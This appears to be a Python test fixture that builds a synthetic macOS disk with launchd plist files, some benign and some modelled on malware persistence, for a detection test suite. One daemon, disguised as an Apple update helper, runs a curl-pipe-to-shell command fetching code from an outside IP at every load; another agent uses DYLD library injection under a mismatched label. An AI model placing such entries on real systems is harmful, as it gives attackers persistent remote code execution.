"""Synthetic macOS volume with launchd plists for the test-suite."""

from __future__ import annotations

import plistlib
from pathlib import Path


def _w(root: Path, rel: str, d: dict):
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(plistlib.dumps(d))
    return p


def build_volume(root: Path) -> Path:
    # --- Apple, benign ---
    _w(root, "System/Library/LaunchDaemons/com.apple.mDNSResponder.plist", {
        "Label": "com.apple.mDNSResponder",
        "ProgramArguments": ["/usr/sbin/mDNSResponder"],
        "RunAtLoad": True, "KeepAlive": True})

    # --- benign 3rd party ---
    _w(root, "Library/LaunchAgents/com.docker.helper.plist", {
        "Label": "com.docker.helper",
        "ProgramArguments": ["/Applications/Docker.app/Contents/MacOS/"
                             "com.docker.helper"],
        "RunAtLoad": True})

    # --- persistence: binary in /Users, cradle, at load + keepalive ---
    _w(root, "Library/LaunchDaemons/com.apple.softwareupdated.helper.plist", {
        "Label": "com.apple.softwareupdated.helper",
        "ProgramArguments": ["/bin/sh", "-c",
                             "curl -fsSL http://185.10.20.30/s | sh"],
        "RunAtLoad": True, "KeepAlive": True,
        "StandardOutPath": "/tmp/.u.log",
        "StandardErrorPath": "/tmp/.u.err"})

    # --- user agent: DYLD injection + label/filename mismatch ---
    _w(root, "Users/victim/Library/LaunchAgents/com.adobe.updater.plist", {
        "Label": "com.local.agent",
        "ProgramArguments": ["/Users/victim/.cache/agent"],
        "RunAtLoad": True,
        "EnvironmentVariables": {
            "DYLD_INSERT_LIBRARIES": "/Users/victim/.cache/hook.dylib"}})

    # --- user agent: AppleScript on a calendar schedule ---
    _w(root, "Users/victim/Library/LaunchAgents/com.example.reporter.plist", {
        "Label": "com.example.reporter",
        "ProgramArguments": ["/usr/bin/osascript",
                             "/Users/victim/Scripts/report.scpt"],
        "StartCalendarInterval": {"Hour": 9, "Minute": 0}})

    # --- disabled job (should not raise the mismatch flag path noise) ---
    _w(root, "Library/LaunchAgents/com.old.thing.plist", {
        "Label": "com.old.thing",
        "ProgramArguments": ["/opt/old/bin/thing"],
        "Disabled": True, "RunAtLoad": True})
    return root
